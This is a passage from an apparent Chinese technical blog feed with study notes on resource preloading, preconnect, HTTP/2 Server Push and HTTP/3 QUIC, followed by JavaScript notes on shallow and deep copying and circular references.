C[关键资源]  C --> D[提前加载完成]  D --> E[页面渲染直接使用]</pre><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 基本用法 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; type=&quot;font/woff2&quot; crossorigin&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.css&quot; as=&quot;style&quot;&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;main.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">&lt;!-- HTTP响应头方式（优先级更高） --&gt;<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/critical.css&gt;; rel=preload; as=style<br></code></pre></td></tr></table></figure><p>关键特性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">必填项</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">资源路径</td><td align="left">✔️</td></tr><tr><td align="left">as</td><td align="left">资源类型（font&#x2F;script&#x2F;style）</td><td align="left">✔️</td></tr><tr><td align="left">type</td><td align="left">MIME类型（如font&#x2F;woff2）</td><td align="left">推荐</td></tr><tr><td align="left">crossorigin</td><td align="left">跨域资源必须</td><td align="left">条件</td></tr><tr><td align="left">fetchpriority</td><td align="left">优先级控制（high&#x2F;low）</td><td align="left">Chrome</td></tr></tbody></table><p>适用场景：</p><ul><li>首屏关键CSS：避免渲染阻塞</li><li>自定义字体：消除FOIT（字体未加载时的空白）</li><li>首屏图片：LCP（最大内容绘制）优化</li><li>核心框架JS：提前解析编译</li></ul><p><strong>预连接（preconnect）</strong></p><p>核心作用：提前完成跨域连接的握手阶段，节省DNS+TCP+TLS时间（约100-500ms）。</p><pre class="mermaid">sequenceDiagram    participant Browser    participant CDN as 第三方服务器    Browser->>Browser: 解析HTML发现preconnect    Browser->>CDN: 1. DNS解析    Browser->>CDN: 2. TCP握手    Browser->>CDN: 3. TLS协商    Note over Browser,CDN: 连接就绪（节省3次RTT）    Browser->>CDN: 实际资源请求（立即发送）</pre><p>实现方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 预连接第三方源 --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot;&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://api.example.com&quot; crossorigin&gt;<br><br>&lt;!-- DNS预取（更轻量） --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cdn.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p>关键属性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">href</td><td align="left">目标域名（无路径）</td></tr><tr><td align="left">crossorigin</td><td align="left">需凭证的资源必须设置</td></tr></tbody></table><p>适用场景：</p><ul><li>CDN资源域：静态资源加载</li><li>API接口域：AJAX请求优化</li><li>分析统计域：Google Analytics等</li><li>第三方组件：社交媒体插件</li></ul><p><strong>对比决策指南</strong></p><table><thead><tr><th align="left">特性</th><th align="left">preload</th><th align="left">preconnect</th></tr></thead><tbody><tr><td align="left">优化目标</td><td align="left">资源本身</td><td align="left">网络连接</td></tr><tr><td align="left">网络消耗</td><td align="left">高（传输资源内容）</td><td align="left">低（仅握手）</td></tr><tr><td align="left">执行时机</td><td align="left">立即下载资源</td><td align="left">建立连接池备用</td></tr><tr><td align="left">最佳适用</td><td align="left">已知URL的关键渲染资源</td><td align="left">未知URL的第三方域</td></tr><tr><td align="left">优先级</td><td align="left">非常高（强制加载）</td><td align="left">高</td></tr><tr><td align="left">浏览器支持</td><td align="left">Chrome&gt;58, Firefox&gt;56, Safari&gt;11</td><td align="left">Chrome&gt;46, Firefox&gt;39, Safari&gt;11</td></tr></tbody></table><h2 id="4-3-协议升级"><a href="#4-3-协议升级" class="headerlink" title="4.3 协议升级"></a>4.3 协议升级</h2><h3 id="HTTP-2服务端推送（Server-Push）"><a href="#HTTP-2服务端推送（Server-Push）" class="headerlink" title="HTTP&#x2F;2服务端推送（Server Push）"></a>HTTP&#x2F;2服务端推送（Server Push）</h3><p><strong>核心原理</strong></p><p>服务端在响应主资源请求时，主动推送关联子资源到浏览器缓存，消除传统”请求-响应”链的串行延迟。</p><pre class="mermaid">sequenceDiagram    participant Client as 客户端    participant Server as 服务器    Client->>Server: 请求HTML文档 (GET /index.html)    Server->>Server: 解析HTML依赖 (CSS/JS/图片)    Server->>Client: 响应HTML + PUSH_PROMISE帧 (承诺推送/css/style.css)    Server->>Client: 推送CSS文件 (DATA帧)    Server->>Client: 推送JS文件 (PUSH_PROMISE + DATA)    Client->>Client: 从缓存直接加载推送资源    Note over Client: 渲染无需等待后续请求</pre><p><strong>与传统加载对比</strong></p><table><thead><tr><th align="left">阶段</th><th align="left">HTTP&#x2F;1.1</th><th align="left">HTTP&#x2F;2 + Server Push</th></tr></thead><tbody><tr><td align="left">首次请求</td><td align="left">获取HTML</td><td align="left">获取HTML</td></tr><tr><td align="left">发现子资源</td><td align="left">解析HTML → 发起CSS&#x2F;JS请求</td><td align="left">无需请求（已推送至缓存）</td></tr><tr><td align="left">资源传输</td><td align="left">顺序等待（队头阻塞）</td><td align="left">并行传输</td></tr><tr><td align="left">渲染开始</td><td align="left">300-500ms</td><td align="left">0ms（CSS已就绪）</td></tr></tbody></table><p><strong>技术实现详解</strong></p><p>(1) 推送触发条件</p><ul><li>显式配置（开发者指定）</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx配置</span><br><span class="hljs-attribute">http2_push</span> /static/style.css;<br><span class="hljs-attribute">http2_push_preload</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># 解析Link头部</span><br></code></pre></td></tr></table></figure><ul><li>隐式触发（需启用<code>http2_push_preload</code>）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"># 响应头声明需推送资源<br><span class="hljs-attribute">Link</span><span class="hljs-punctuation">: </span>&lt;/static/script.js&gt;; rel=preload; as=script<br></code></pre></td></tr></table></figure><p>(2) 推送协议流程</p><ul><li>发送 PUSH_PROMISE帧<ul><li>包含欲推送资源的请求头（:path&#x2F;:authority）</li><li>承诺的 流ID 为偶数（区分客户端请求的奇数流）</li></ul></li><li>推送 HEADERS+DATA帧<ul><li>在原始响应流完成前发送推送资源</li></ul></li><li>客户端 缓存管理<ul><li>浏览器验证缓存有效性（类似常规请求）</li></ul></li></ul><p>(3) 客户端控制机制</p><ul><li>接受推送：默认自动缓存（除非缓存头禁止）</li><li>拒绝推送：发送 RST_STREAM帧（场景：资源已缓存）</li></ul><pre class="mermaid">sequenceDiagram    Server->>Client: PUSH_PROMISE (流ID:2)    alt 客户端需要该资源        Client-->>Server: 无操作（接受推送）    else 资源已缓存        Client->>Server: RST_STREAM (流ID:2)    end</pre><p><strong>性能优化场景</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统方式问题</th><th align="left">Server Push解决方案</th></tr></thead><tbody><tr><td align="left">关键CSS阻塞渲染</td><td align="left">需往返请求 → 延迟渲染</td><td align="left">推送CSS → 实现”0-RTT渲染”</td></tr><tr><td align="left">字体加载空白(FOIT)</td><td align="left">文字延迟显示</td><td align="left">推送字体文件 → 消除布局偏移</td></tr><tr><td align="left">首屏图片(LCP)</td><td align="left">图片请求靠后 → LCP延迟</td><td align="left">推送英雄图 → 加速LCP</td></tr></tbody></table><p><strong>配置最佳实践：Node.js 实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> http2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http2&#x27;</span>);<br><span class="hljs-keyword">const</span> server = http2.<span class="hljs-title function_">createSecureServer</span>(&#123; cert, key &#125;);<br><br>server.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;stream&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">stream, headers</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (headers[<span class="hljs-string">&#x27;:path&#x27;</span>] === <span class="hljs-string">&#x27;/index.html&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 推送CSS</span><br>    stream.<span class="hljs-title function_">pushStream</span>(&#123; <span class="hljs-string">&#x27;:path&#x27;</span>: <span class="hljs-string">&#x27;/style.css&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">pushStream</span>) =&gt;</span> &#123;<br>      pushStream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;style.css&#x27;</span>, &#123;<br>        <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/css&#x27;</span><br>      &#125;);<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 响应HTML</span><br>    stream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, &#123;<br>      <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span><br>    &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>黄金法则</strong></p><ul><li>仅推送关键渲染资源<ul><li>首屏CSS</li><li>阻塞渲染JS</li><li>LCP图片</li></ul></li><li>体积控制<ul><li>单页推送资源≤30KB</li><li>总推送量≤100KB（避免队头阻塞）</li></ul></li><li>缓存感知<ul><li>结合 Cache-Digest 草案（暂未普及）</li><li>短TTL资源避免推送（如个性化内容）</li></ul></li></ul><p><strong>浏览器支持与限制</strong></p><table><thead><tr><th align="left">浏览器</th><th align="left">支持版本</th><th align="left">特殊限制</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">49+</td><td align="left">需HTTPS</td></tr><tr><td align="left">Firefox</td><td align="left">44+</td><td align="left">允许HTTP推送（非标准）</td></tr><tr><td align="left">Safari</td><td align="left">不支持</td><td align="left">技术路线转向103 Early Hints</td></tr><tr><td align="left">Edge</td><td align="left">12+</td><td align="left">同Chromium</td></tr></tbody></table><h3 id="HTTP-3的QUIC协议优势"><a href="#HTTP-3的QUIC协议优势" class="headerlink" title="HTTP&#x2F;3的QUIC协议优势"></a>HTTP&#x2F;3的QUIC协议优势</h3><p><strong>QUIC协议核心优势</strong></p><p>(1) 连接建立优化（0-1 RTT）</p><ul><li>首次连接：QUIC合并传输层与加密层握手 → 1-RTT完成连接+TLS协商（对比TCP+TLS的2-3 RTT）</li><li>会话恢复：支持0-RTT握手，客户端缓存密钥后可直接发送数据（如重复访问用户瞬间加载资源）</li></ul><pre class="mermaid">sequenceDiagram    客户端->>服务器: 首次请求 (1-RTT)    服务器->>客户端: 返回加密密钥（缓存）    客户端->>服务器: 后续请求 (0-RTT + 应用数据)</pre><p>(2) 彻底解决队头阻塞（HOL Blocking）</p><ul><li>HTTP&#x2F;2问题：基于TCP的多路复用中，单个包丢失会阻塞所有流</li><li>QUIC方案：在UDP上实现独立流控制，每个流单独处理丢包重传 → 包丢失仅影响当前流，其他流正常传输</li></ul><p>(3) 无缝连接迁移</p><ul><li>传统TCP问题：网络切换（如Wi-Fi→4G）导致连接中断 → 需重新握手</li><li>QUIC方案：通过Connection ID标识连接（非IP&#x2F;端口四元组） → 网络切换时连接保持活跃</li></ul><p>(4) 默认强加密与安全性</p><ul><li>强制TLS 1.3：所有QUIC流量默认加密，支持前向保密（PFS） → 即使密钥泄露，历史数据仍安全</li><li>抗重放攻击：通过单次密钥派生值验证，拒绝重复请求 </li><li>防协议降级：集成TLS 1.3的抗降级机制，阻止中间人强制低版本加密</li></ul><p>(5) 拥塞控制优化</p><ul><li>动态算法：内置BBR（Bottleneck Bandwidth and Round-trip）算法 → 高延迟网络中吞吐量提升30%+</li><li>用户态实现：协议栈位于应用层（非内核），可快速迭代拥塞算法</li></ul><p>(6) 头部压缩与传输效率</p><ul><li>QPACK压缩：改进HTTP&#x2F;2的HPACK，支持乱序编码 → 减少30%头部开销。</li><li>前向纠错（FEC）：添加冗余数据包，少量丢包时无需重传 → 弱网下视频卡顿率降低50%</li></ul><p><strong>QUIC vs TCP&#x2F;TLS 关键对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">TCP&#x2F;TLS（HTTP&#x2F;2）</th><th align="left">QUIC（HTTP&#x2F;3）</th><th align="left">前端影响</th></tr></thead><tbody><tr><td align="left">连接建立</td><td align="left">2-3 RTT</td><td align="left">0-1 RTT</td><td align="left">LCP时间↓34%</td></tr><tr><td align="left">多路复用</td><td align="left">流级阻塞</td><td align="left">包级独立</td><td align="left">FCP稳定性↑</td></tr><tr><td align="left">网络切换</td><td align="left">连接中断</td><td align="left">无缝迁移</td><td align="left">移动端跳出率↓</td></tr><tr><td align="left">加密机制可选TLS强制TLS 1.3混合内容风险消除</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">部署灵活性</td><td align="left">依赖操作系统内核</td><td align="left">用户态协议栈</td><td align="left">快速拥塞算法更新</td></tr></tbody></table><h1 id="五、高级网络技术"><a href="#五、高级网络技术" class="headerlink" title="五、高级网络技术"></a>五、高级网络技术</h1><h2 id="5-1-API设计规范"><a href="#5-1-API设计规范" class="headerlink" title="5.1 API设计规范"></a>5.1 API设计规范</h2><h3 id="RESTful架构原则（资源化-状态转移）"><a href="#RESTful架构原则（资源化-状态转移）" class="headerlink" title="RESTful架构原则（资源化&#x2F;状态转移）"></a>RESTful架构原则（资源化&#x2F;状态转移）</h3><h3 id="GraphQL查询与REST对比"><a href="#GraphQL查询与REST对比" class="headerlink" title="GraphQL查询与REST对比"></a>GraphQL查询与REST对比</h3><h2 id="5-2-调试与监控"><a href="#5-2-调试与监控" class="headerlink" title="5.2 调试与监控"></a>5.2 调试与监控</h2><h3 id="浏览器Network面板分析（Waterfall-Timing）"><a href="#浏览器Network面板分析（Waterfall-Timing）" class="headerlink" title="浏览器Network面板分析（Waterfall&#x2F;Timing）"></a>浏览器Network面板分析（Waterfall&#x2F;Timing）</h3><h3 id="性能指标（TTFB-LCP-FCP）监控"><a href="#性能指标（TTFB-LCP-FCP）监控" class="headerlink" title="性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控"></a>性能指标（TTFB&#x2F;LCP&#x2F;FCP）监控</h3><h2 id="5-3-新兴技术"><a href="#5-3-新兴技术" class="headerlink" title="5.3 新兴技术"></a>5.3 新兴技术</h2><h3 id="WebRTC基础（P2P通信-信令服务）"><a href="#WebRTC基础（P2P通信-信令服务）" class="headerlink" title="WebRTC基础（P2P通信&#x2F;信令服务）"></a>WebRTC基础（P2P通信&#x2F;信令服务）</h3><h3 id="WebTransport协议探索"><a href="#WebTransport协议探索" class="headerlink" title="WebTransport协议探索"></a>WebTransport协议探索</h3>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript 专题知识学习</title>
    <link href="/2025/06/19/JavaScript%20Study%20Notes/"/>
    <url>/2025/06/19/JavaScript%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="深拷贝与浅拷贝"><a href="#深拷贝与浅拷贝" class="headerlink" title="深拷贝与浅拷贝"></a>深拷贝与浅拷贝</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>浅拷贝（shallow copy）</strong></p><p>浅拷贝只复制对象的第一层属性，如果属性类型是基本类型，则复制其值，如果属性类型是引用类型，则复制其在内存中的地址（即引用），因此拷贝后的对象与原对象共享引用类型的属性</p><p><strong>深拷贝（deep copy）</strong></p><p>深拷贝会递归复制对象的所有层级，创建一个全新的对象，新对象与原对象不共享任何引用类型的属性</p><span id="more"></span><h2 id="浅拷贝的实现方式"><a href="#浅拷贝的实现方式" class="headerlink" title="浅拷贝的实现方式"></a>浅拷贝的实现方式</h2><p><strong>Object.assign()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, obj);<br></code></pre></td></tr></table></figure><p><strong>展开运算符</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = &#123; ...obj &#125;;<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.slice()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">slice</span>();<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.concat()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">concat</span>();<br></code></pre></td></tr></table></figure><h2 id="深拷贝的实现方式"><a href="#深拷贝的实现方式" class="headerlink" title="深拷贝的实现方式"></a>深拷贝的实现方式</h2><p><strong>JSON.parse(JSON.stringify())</strong></p><p>最简单但有限制的深拷贝方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br></code></pre></td></tr></table></figure><p>局限性：</p><ul><li>不能处理函数、Symbol、undefined，会被完全删除</li><li>不能处理循环引用</li><li>会丢失 Date 对象的类型（转为 ISO 格式字符串）</li><li>会丢失 RegExp 对象的类型（转为空对象）</li><li>会丢失 Map&#x2F;Set 等特殊对象（转为空对象）</li></ul><p>需要注意的是：</p><ul><li>null 是 Json 规范中的合法值，因此 Json.parse(Json.stringify())是可以正确处理 null 的</li><li>NaN 和 Infinity 会被转为 null，因为它们在 JavaScript 属于 Number 类型，Json 规范中没有 NaN 和 Infinity 这种值，序列化过程中会转为 null</li></ul><p><strong>递归实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 处理循环引用</span><br>  <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) &#123;<br>    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);<br>  &#125;<br>  <br>  <span class="hljs-keyword">let</span> clone;<br>  <br>  <span class="hljs-comment">// 处理特殊对象类型</span><br>  <span class="hljs-keyword">switch</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Date]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj.<span class="hljs-title function_">getTime</span>());<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object RegExp]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Map]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function">(<span class="hljs-params">[key, val]</span>) =&gt;</span> [key, <span class="hljs-title function_">deepClone</span>(val, hash)]));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Set]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(val, hash)));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Array]&#x27;</span>:<br>      clone = obj.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(item, hash));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// 处理普通对象</span><br>      clone = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj));<br>      hash.<span class="hljs-title function_">set</span>(obj, clone);<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) &#123;<br>          clone[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);<br>        &#125;<br>      &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>第三方工具库</strong></p><ul><li>Lodash 的 <code>_.cloneDeep()</code></li><li>jQuery 的 <code>$.extend(true, &#123;&#125;, obj)</code></li></ul><h2 id="性能考虑"><a href="#性能考虑" class="headerlink" title="性能考虑"></a>性能考虑</h2><p>深拷贝比浅拷贝更消耗性能，特别是在处理大型对象或深层嵌套结构时，实际应用中应结合需求选择合适的拷贝方式</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p><strong>适合浅拷贝的场景</strong></p><ul><li>明确知道只需要拷贝第一层属性</li><li>需要快速拷贝而不关心嵌套对象的引用关系</li><li>对象属性都是基本类型</li></ul><p><strong>适合深拷贝的场景</strong></p><ul><li>需要完全独立的对象副本</li><li>需要修改嵌套对象但又不能影响原对象</li><li>处理不可变数据（如 Redux 的 state 更新）</li></ul><h2 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：如何判断一个拷贝是深拷贝还是浅拷贝？</strong></p><p>可以通过修改拷贝对象的某个引用类型属性，查看原对象的属性是否被影响来判断</p><p><strong>Q：如何实现一个支持循环引用的深拷贝？</strong></p><p>使用 WeakMap 来存储已拷贝的对象，遇到相同的引用时直接返回存储的值</p><p><strong>Q：为什么Json.parse(Json.stringify())不能处理函数？</strong></p><p>因为 Json 格式不支持函数，在序列化过程中函数会被忽略</p><p><strong>Q：深拷贝和浅拷贝在性能上有什么区别？</strong></p><p>深拷贝需要递归遍历所有属性，性能开销大，特别是对于大型对象或深层嵌套结构</p><p><strong>Q：如何实现一个支持特殊对象（如 Date、RegExp）的深拷贝？</strong></p><p>需要在拷贝时判断对象类型，根据不同类型做特殊处理</p><h1 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h1><h2 id="循环引用的定义"><a href="#循环引用的定义" class="headerlink" title="循环引用的定义"></a>循环引用的定义</h2><p>循环引用是指对象之间相互引用，形成闭环的情况，简单来说就是对象 A 引用了对象 B，对象 B 又直接或间接的引用了对象 A</p><h2 id="循环引用的示例"><a href="#循环引用的示例" class="headerlink" title="循环引用的示例"></a>循环引用的示例</h2><p><strong>简单循环引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> objA = &#123;&#125;;<br><span class="hljs-keyword">const</span> objB = &#123; <span class="hljs-attr">a</span>: objA &#125;;<br>objA.<span class="hljs-property">b</span> = objB; <span class="hljs-comment">// 形成循环引用</span><br></code></pre></td></tr></table></figure><p><strong>自引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj; <span class="hljs-comment">// 对象引用自身</span><br></code></pre></td></tr></table></figure><p><strong>复杂循环引用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Parent&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> child = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Child&quot;</span>, <span class="hljs-attr">parent</span>: parent &#125;;<br>parent.<span class="hljs-property">child</span> = child; <span class="hljs-comment">// 形成循环引用</span><br></code></pre></td></tr></table></figure><h2 id="循环引用带来的问题"><a href="#循环引用带来的问题" class="headerlink" title="循环引用带来的问题"></a>循环引用带来的问题</h2><p><strong>Json 序列化问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj); <span class="hljs-comment">// 抛出错误: TypeError: Converting circular structure to JSON</span><br></code></pre></td></tr></table></figure><p><strong>深拷贝问题</strong></p><p>普通的深拷贝方法（如递归拷贝）如果没有特殊处理循环引用，会导致无限递归</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code 